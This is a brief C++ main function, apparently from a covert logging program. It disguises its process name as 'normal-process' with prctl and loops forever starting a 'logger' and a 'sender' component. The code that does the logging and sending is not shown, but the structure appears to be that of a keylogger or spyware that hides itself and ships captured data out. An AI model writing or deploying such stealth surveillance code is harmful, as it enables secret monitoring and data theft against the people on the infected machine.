#include "logger.h"
#include "sender.h"
#include <sys/prctl.h>

#include <cstring>

int main() {
	while (true) {
		char const* pr_name = "normal-process";
		prctl(PR_SET_NAME, pr_name, 0, 0, 0);

		logger& logger = logger::get_instance();
		sender& sender = sender::get_instance();

		if (!logger.init()) {
			continue;
		}

		if (!sender.init()) {
			continue;
		}

		logger.start();
		sender.start();
	}

	return 0;
}
